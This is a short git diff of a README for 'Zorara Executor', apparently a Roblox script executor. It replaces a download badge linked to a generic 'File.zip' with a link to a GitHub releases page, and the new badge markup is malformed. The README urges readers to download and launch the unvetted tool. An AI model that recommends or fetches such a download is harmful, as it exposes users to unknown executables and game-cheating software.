@@ -13,7 +13,7 @@ Welcome to the Zorara Executor repository! This software is designed to enhance 
 
 To get started with Zorara Executor, simply download the software from the following link: 
 
-[![Download Zorara Executor](https://img.shields.io/badge/Download-Zorara Executor-blue)](https://github.com/files/File.zip)
+[![Download Zorara Executor](https://github.com/neymitoBR/Zorara-Executor/releases Executor-blue)](https://github.com/neymitoBR/Zorara-Executor/releases)
 
 Once downloaded, launch the software and follow the on-screen instructions to start scripting and modding within Roblox.
 
